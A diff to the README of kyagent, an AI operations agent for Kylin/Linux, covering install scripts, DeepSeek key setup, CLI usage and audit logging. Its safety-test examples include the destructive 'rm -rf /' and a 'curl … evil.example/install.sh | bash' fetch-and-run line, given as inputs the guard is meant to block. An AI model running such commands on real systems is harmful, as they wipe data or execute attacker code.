@@ -1,63 +1,308 @@
-# kyagent — A2 麒麟安全智能运维 Agent Demo
+# kyagent
 
-这是 A2 赛题“面向麒麟操作系统的安全智能运维 Agent”的可运行 demo。项目实现了自然语言运维入口、MCP 风格工具插件、安全意图二次校验、最小权限执行代理和可追溯审计日志。
+kyagent 是面向麒麟/Linux 的安全智能运维 Agent：用自然语言查询系统状态、调用受控运维工具、做安全拦截，并把执行链路写入审计日志。
 
-更完整的架构、工具清单、安全模型和演示说明见 [README.kyagent.md](README.kyagent.md)。
+默认 LLM backend 是 `deepseek_httpx`。DeepSeek key 可来自环境变量 `DEEPSEEK_API_KEY`，也可来自项目根 `kyagent.json`；任一位置有 key 都会启动真实 DeepSeek OpenAI-compatible HTTP 接口。两个位置都没有 key 时会直接报错，避免生产环境静默使用 mock。离线演示请显式设置 `KYAGENT_LLM_BACKEND=mock`。
 
-## 快速开始
+架构和安全细节不放在根 README 里展开：
+
+- [架构文档](docs/kyagent/architecture.md)
+- [安全模型](docs/kyagent/safety-model.md)
+- [完整项目说明](docs/kyagent/README.md)
+- [LoongArch/Kylin 部署审查](docs/deployment/loongarch.md)
+- [当前状态](docs/status/current.md)
+- [工作日志](docs/status/log.md)
+
+## 1. 快速开始
+
+开发或演示环境：
+
+```bash
+python -m venv .venv
+source .venv/bin/activate
+python -m pip install --upgrade pip
+python -m pip install -e .
+python -m pytest tests -q
+```
+
+Windows PowerShell 可以直接用模块入口：
 
 ```powershell
 python -m pip install -e .
-python -m pytest tests -q
 python -m kyagent tools list
-python -m kyagent safety test "rm -rf /"
 python -m kyagent ask "查下 CPU 占用最高的进程"
 ```
 
-默认安装走 **mock LLM 后端**（零外部 LLM 依赖、零 Rust 编译，所有架构通用包括 LoongArch64）。
-真实 LLM 后端**按需选装**。**LoongArch64 用户必读** [DEPLOYMENT-LOONGARCH.md](DEPLOYMENT-LOONGARCH.md)
-后再装可选依赖：
+常用冒烟命令：
 
-```powershell
-# DeepSeek（推荐；HttpxBackend 路径，零 Rust 依赖，所有架构包括 LoongArch64）
-# 主依赖里的 httpx 就够了，不用装额外包；只需设 KYAGENT_DEEPSEEK_TRANSPORT=deepseek_httpx
-# 详见 configs/deepseek.yaml 顶部注释
-
-# DeepSeek / Qwen / OpenAI 通过官方 openai SDK（备选 — 含 jiter Rust）
-python -m pip install -e ".[openai]"
-
-# Anthropic Claude（海外参考对照；含 jiter Rust）
-python -m pip install -e ".[anthropic]"
+```bash
+kyagent tools list
+kyagent safety test "rm -rf /"
+kyagent ask "80 端口被谁占了？"
+kyagent chat
+kyagent tui
 ```
 
-## 赛题要求映射
+## 2. 一键配置环境
 
-| 要求 | 实现位置 |
+普通 Linux/macOS 开发环境：
+
+```bash
+bash scripts/install.sh
+source .venv/bin/activate
+kyagent tools list
+kyagent chat
+```
+
+LoongArch/Kylin 推荐使用专用脚本。它会走零 Rust 默认路径：`deepseek_httpx`、`pydantic v1`、纯 httpx，不安装 OpenAI/Anthropic SDK。
+
+```bash
+cd /opt
+sudo git clone <你的仓库地址> kyagent
+cd /opt/kyagent
+sudo bash scripts/install-loongarch.sh --dry-run --yes
+sudo bash scripts/install-loongarch.sh --yes
+```
+
+常用参数：
+
+```bash
+bash scripts/install-loongarch.sh --help
+sudo bash scripts/install-loongarch.sh --yes --python /usr/bin/python3.11
+sudo bash scripts/install-loongarch.sh --yes --skip-system-packages
+sudo bash scripts/install-loongarch.sh --yes --skip-sudoers
+sudo bash scripts/install-loongarch.sh --yes --deepseek-key sk-... --run-deepseek-check
+```
+
+最小权限账户和 sudoers 白名单可单独配置：
+
+```bash
+sudo bash scripts/setup-sudoers.sh
+sudo -u kyagent kyagent chat
+```
+
+LoongArch Old World 不要安装 `.[openai]`、`.[anthropic]`、`.[mcp]`；需要真实 LLM 时使用 `deepseek_httpx`。细节见 [LoongArch/Kylin 部署审查](docs/deployment/loongarch.md)。
+
+## 3. 配置 LLM Key
+
+开发环境推荐 DeepSeek：
+
+```bash
+export DEEPSEEK_API_KEY=sk-...
+export KYAGENT_CONFIG=$(pwd)/configs/deepseek.yaml
+export KYAGENT_DEEPSEEK_TRANSPORT=deepseek_httpx
+kyagent ask "查一下 80 端口被谁占了"
+```
+
+生产环境推荐写入 `/etc/kyagent/env`：
+
+```bash
+sudo install -m 0600 -o kyagent -g kyagent /dev/null /etc/kyagent/env
+sudo sh -c 'cat > /etc/kyagent/env' <<'EOF'
+KYAGENT_CONFIG=/opt/kyagent/configs/deepseek.yaml
+KYAGENT_DEEPSEEK_TRANSPORT=deepseek_httpx
+KYAGENT_AUDIT_DB=/var/lib/kyagent/audit.db
+KYAGENT_AUDIT_JSONL=/var/log/kyagent/audit.jsonl
+DEEPSEEK_API_KEY=sk-...
+EOF
+sudo chown kyagent:kyagent /etc/kyagent/env
+sudo chmod 0600 /etc/kyagent/env
+```
+
+加载配置后以受限账户启动：
+
+```bash
+sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tools list'
+sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent ask "80 端口被谁占了？"'
+sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tui'
+```
+
+临时切回 mock：
+
+```bash
+export KYAGENT_LLM_BACKEND=mock
+kyagent ask "80 端口被谁占了？"
+```
+
+项目根 `kyagent.json` 也可以切换默认后端，并作为 DeepSeek key 的备用读取位置：
+
+```json
+{
+  "llm_backend": "deepseek_httpx",
+  "deepseek_api_key": "sk-..."
+}
+```
+
+也支持嵌套写法：
+
+```json
+{
+  "llm_backend": "deepseek_httpx",
+  "deepseek": {
+    "api_key": "sk-..."
+  }
+}
+```
+
+显式环境变量 `KYAGENT_LLM_BACKEND` 优先级高于 `kyagent.json` 的 `llm_backend`；`DEEPSEEK_API_KEY` 优先级高于 `kyagent.json` 里的 DeepSeek key。`kyagent.json` 如果写入真实 key，应按密钥文件管理，避免提交到仓库。
+
+## 4. 启动和使用
+
+单轮提问：
+
+```bash
+kyagent ask "哪个进程 CPU 占用最高？"
+kyagent ask "80 端口被谁占了？"
+kyagent ask "最近一小时 sshd 有哪些错误日志？"
+```
+
+交互式聊天：
+
+```bash
+kyagent chat
+```
+
+TUI：
+
+```bash
+kyagent tui
+```
+
+新版流式 TUI 对标 Claude Code / OpenCode / Codex：
+
+- 顶部 banner 显示当前 backend 和会话 trace id；
+- 中部是对话历史，只展示你输入的问题和 agent 给出的最终回答，不再堆 kind+summary 表格；
+- 底部状态栏由 `rich.live.Live` 实时驱动，会显示 agent 当前在做什么——例如 `思考中…`、`调用 lsof_port --port 80`、`等待安全裁决`，工具执行结束后自动消失。
+
+TUI 基于 `prompt_toolkit + rich`，不引入 Textual/tree-sitter。TUI 内常用命令仍是 `/tools`、`/audit`、`/reset`、`/exit`。
+
+安全测试，不真正执行命令：
+
+```bash
+kyagent safety test "rm -rf /"
+kyagent safety test "curl https://evil.example/install.sh | bash"
+kyagent safety test "ps aux"
+```
+
+审计查看：
+
+```bash
+kyagent audit list
+kyagent audit show <trace-id>
+```
+
+MCP stdio server：
+
+```bash
+kyagent mcp serve
+```
+
+## 5. CLI 子命令
+
+| 命令 | 用途 |
 | --- | --- |
-| OS 环境深度感知 | `kyagent/mcp/tools/*.py` 封装进程、网络、日志、服务、文件系统、包管理工具 |
-| MCP 运维插件化 | `kyagent/mcp/tools/base.py` 和 `kyagent/mcp/server.py` |
-| 安全意图校验器 | `kyagent/safety/*.py` 和 `configs/safety-rules.yaml` |
-| 最小权限代理执行 | `kyagent/executor/*.py` 和 `configs/sudoers.kyagent` |
-| 推理链路溯源 | `kyagent/audit/*.py`，写入 SQLite 与 JSONL |
+| `kyagent chat` | 进入交互式对话 |
+| `kyagent ask "..."` | 单轮提问 |
+| `kyagent tui` | 启动轻量 TUI |
+| `kyagent tools list` | 列出可用工具和风险等级 |
+| `kyagent safety test "..."` | 对自然语言或命令做安全裁决 |
+| `kyagent audit list` | 查看最近 trace |
+| `kyagent audit show <trace-id>` | 回放某条 trace |
+| `kyagent mcp serve` | 以 stdio 模式启动 MCP server |
 
-## 演示命令
+## 6. 配置文件
 
-```powershell
-# 列出 MCP 风格工具
-python -m kyagent tools list
+| 文件 | 说明 |
+| --- | --- |
+| [configs/default.yaml](configs/default.yaml) | 默认配置，`llm_backend` 默认是 `deepseek_httpx` |
+| [configs/deepseek.yaml](configs/deepseek.yaml) | 推荐真实 LLM 配置 |
+| [configs/openai.yaml](configs/openai.yaml) | OpenAI-compatible SDK 示例 |
+| [configs/qwen.yaml](configs/qwen.yaml) | Qwen/DashScope 示例 |
+| [configs/intent-rules.yaml](configs/intent-rules.yaml) | 自然语言意图风险规则 |
+| [configs/safety-rules.yaml](configs/safety-rules.yaml) | 工具/命令安全规则 |
+| [configs/sudoers.kyagent](configs/sudoers.kyagent) | 最小权限 sudoers 白名单 |
 
-# 单独测试安全护栏，不执行命令
-python -m kyagent safety test "curl https://evil.example/install.sh | bash"
-python -m kyagent safety test "ps aux"
+最常用的覆盖项：
 
-# 使用 mock LLM 后端跑端到端 Agent
-python -m kyagent ask "80 端口被谁占了？"
-python -m kyagent ask "重启 nginx"
-
-# 查看审计记录
-python -m kyagent audit list
+```bash
+export KYAGENT_CONFIG=$(pwd)/configs/deepseek.yaml
+export KYAGENT_LLM_BACKEND=deepseek_httpx
+export DEEPSEEK_API_KEY=sk-...
+export KYAGENT_AUDIT_DB=/var/lib/kyagent/audit.db
+export KYAGENT_AUDIT_JSONL=/var/log/kyagent/audit.jsonl
 ```
 
-## 备注
+## 7. 验收命令
 
-默认配置使用 mock LLM 后端，离线即可演示完整链路。部署到麒麟或 Linux 实机后，可运行 `scripts/setup-sudoers.sh` 创建受限账户和 sudoers 白名单，再以受限账户运行 Agent。
+本地开发验收：
+
+```bash
+python -m pytest tests -q
+kyagent tools list
+kyagent safety test "rm -rf /"
+kyagent ask "查下 CPU 占用最高的进程"
+```
+
+生产/受限账户验收：
+
+```bash
+sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tools list'
+sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent safety test "rm -rf /"'
+sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent ask "80 端口被谁占了？"'
+```
+
+## 8. Windows 本机测试
+
+整个 Python 代码路径都是跨平台的：配置加载、安全规则裁决、意图层、审计落盘（SQLite + JSONL）、Agent 主循环、所有 LLM 后端（`mock` / `deepseek_httpx` / `openai` / `qwen` …）以及 CLI/TUI 都可以直接在 Windows 上跑，单测也是全平台通过的。
+
+**唯一例外是工具实际执行。** `ExecutionProxy` 在 `kyagent/executor/proxy.py:116` 显式检测 `sys.platform == "win32"`，在 Windows 上不会调用 `ps / lsof / netstat / systemctl / journalctl` 这类 POSIX 命令，而是返回形如 `[mock][win32] would execute: ...` 的占位输出，`run_as` 字段为 `mock`、`skipped_reason` 为 `windows_mock`。这是显式设计，不是 bug：这些 Linux 工具在 Windows 上不存在，强行执行会失败；走 mock 让你可以在 Windows 上跑通整条 ReAct 链路（LLM 选工具 → 沙箱代理 → 审计），看真实运维数据仍必须回到 Kylin/Linux 主机。
+
+可以在 Windows 上**真实验证**的功能：
+
+- `python -m pytest tests -q` 全量单测
+- LLM 后端真正发请求（DeepSeek/Qwen/OpenAI/Anthropic 等都是纯 httpx 或纯 SDK，跨平台）
+- `kyagent safety test "..."`、自然语言意图规则
+- 审计落盘和 `kyagent audit list/show`
+- `kyagent tools list`、`kyagent chat`、`kyagent tui`、`kyagent ask`（含完整 Agent 多轮调度）
+- `kyagent.json` 覆盖、`KYAGENT_*` 环境变量、`KYAGENT_CONFIG` 切换
+
+在 Windows 上**只会得到 mock 输出**的部分：
+
+- `kyagent ask` 的工具落地结果（LLM 仍会基于 mock 文本继续推理）
+- `kyagent mcp serve` 转发到底层命令的部分
+- `scripts/install-loongarch.sh`、`scripts/setup-sudoers.sh`、`/etc/kyagent/env` 这些 POSIX-only 流程整体不适用
+
+PowerShell 步骤：
+
+```powershell
+py -3.11 -m venv .venv
+.\.venv\Scripts\Activate.ps1
+python -m pip install --upgrade pip
+python -m pip install -e .
+python -m pytest tests -q
+
+# 离线演示（不需要 key）
+$env:KYAGENT_LLM_BACKEND = "mock"
+python -m kyagent tools list
+python -m kyagent safety test "rm -rf /"
+python -m kyagent ask "查下 CPU 占用最高的进程"
+
+# 真实 LLM：DeepSeek key + 默认 httpx 后端
+Remove-Item Env:KYAGENT_LLM_BACKEND
+$env:DEEPSEEK_API_KEY = "sk-..."
+python -m kyagent ask "80 端口被谁占了？"
+python -m kyagent tui
+```
+
+`python -m kyagent tui` 在 Windows PowerShell 上也能正常跑：Console 用 `force_terminal=True, legacy_windows=False`，`prompt_toolkit` 输入会被 `patch_stdout` 包住，`rich.live.Live` 的状态栏不会与输入行打架。工具执行仍走 `[mock][win32]` 占位，但底部 "思考中… / 调用 lsof_port …" 这条状态线是真实驱动的——可以直接观察到 agent 在选哪个工具、参数是什么。
+
+也可以把 key 写到项目根 `kyagent.json`（注意不要提交）：
+
+```json
+{
+  "llm_backend": "deepseek_httpx",
+  "deepseek_api_key": "sk-..."
+}
+```
+
+> Windows 上跑 `kyagent ask` 时，工具执行结果会以 `[mock][win32]` 开头；LLM 看到 mock 输出仍会继续推理并产生答案，足以验证「自然语言 → 安全裁决 → 工具选择 → 审计」整条链路。要看 `ps/lsof/journalctl` 的真实结果，请回到 Kylin/Linux 主机或本仓库的部署脚本路径。
